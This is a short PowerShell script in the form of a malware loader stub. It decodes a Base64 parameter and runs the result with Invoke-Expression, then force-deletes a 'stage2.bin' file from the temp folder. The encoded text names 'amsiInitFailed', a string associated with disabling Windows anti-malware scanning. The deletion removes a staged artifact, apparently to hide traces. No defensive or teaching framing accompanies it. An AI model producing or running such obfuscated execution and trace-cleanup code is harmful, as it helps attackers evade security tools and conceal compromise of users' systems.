
[CmdletBinding()]
param(
    [string]$Base64Text = "JABBAG0AcwBpAE0AYQByAGsAZQByACAAPQAgACIAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACIA"
)
$PayloadText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Base64Text))
IEX $PayloadText
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
